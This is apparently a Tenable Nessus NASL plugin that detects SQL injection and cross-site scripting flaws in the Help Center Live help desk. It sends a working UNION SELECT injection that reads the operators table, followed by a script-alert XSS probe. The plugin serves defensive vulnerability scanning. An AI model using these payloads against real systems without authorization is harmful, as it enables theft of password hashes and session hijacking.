#
# (C) Tenable Network Security
#


if (description) {
  script_id(18296);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-1672", "CVE-2005-1673", "CVE-2005-1674");
  script_bugtraq_id(13666, 13667);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"16651");
    script_xref(name:"OSVDB", value:"16652");
    script_xref(name:"OSVDB", value:"16653");
    script_xref(name:"OSVDB", value:"16654");
    script_xref(name:"OSVDB", value:"16655");
    script_xref(name:"OSVDB", value:"16656");
    script_xref(name:"OSVDB", value:"16657");
    script_xref(name:"OSVDB", value:"16658");
  }

  name["english"] = "Help Center Live Multiple Vulnerabilities (2)";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple vulnerabilities. 

Description :

The remote host is running Help Center Live, a help desk written in
PHP that suffers from multiple vulnerabilities:

  - Multiple SQL Injection Vulnerabilities
    The application fails in many cases to sanitize user-
    supplied input before using it in database queries. As
    long as PHP's 'magic_quotes_gpc' setting is 'off', an
    attacker can exploit these flaws to uncover sensitive
    information such as user's names and password hashes.

  - Multiple Cross-Site Scripting Vulnerabilities.
    There are several ways that an attacker can inject
    arbitrary HTML and script code into a user's browser
    via the affected application. By exploiting them, an
    attacker can not only steal cookies but also cause a
    logged-in admin to perform arbitrary requests.

See also : 

http://www.gulftech.org/?node=research&article_id=00076-05172005

Solution : 

Contact the vendor for a patch.

Risk factor : 

Medium / CVSS Base Score : 4
(AV:R/AC:H/Au:NR/C:P/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple vulnerabilities (2) in Help Center Live";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# For each CGI directory...
foreach dir (cgi_dirs()) {
  # Grab the faq.
  req = http_get(item:string(dir, "/faq/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it looks like Help Center Live...
  pat = '<a href="http://www\\.helpcenterlive\\.com".+>Help Center Live ([^<]+)</a>';
  if (egrep(string:res, pattern:pat, icase:TRUE)) {
    # Try an SQL injection.
    # nb: this requires magic_quotes_gpc to be off.
    req = http_get(
      item:string(
        dir, "/faq/index.php?",
        "x=f&",
        # nb: this returns a table with the NASL script name in one row and
        #     the operator's id in another if the application is vulnerable.
        "id=-99'%20UNION%20SELECT%200,0,'", SCRIPT_NAME, "',operator%20FROM%20hcl_operators%20WHERE%201/*"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see the script name in a table.
    if (
      '<input type="submit" name="search" value="Search" /></td>' >< res &&
      string('<td align="center" width="100%"><b>', SCRIPT_NAME, "</b></td>") >< res
    ) {
      security_warning(port);
      exit(0);
    }

    # If that failed to pick up anything, try to exploit one of the XSS flaws.
    if (get_kb_item("www/"+port+"/generic_xss")) exit(0);

    # A simple alert.
    xss = "<script>alert('" + SCRIPT_NAME + " was here');</script>";
    # nb: the url-encoded version is what we need to pass in.
    exss = "%3Cscript%3Ealert('" + SCRIPT_NAME + "%20was%20here')%3B%3C%2Fscript%3E";

    req = http_get(
      item:string(
        dir, "/faq/index.php?",
        'find=foo">', exss, "&",
        "search=Search"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our XSS.
    if (xss >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
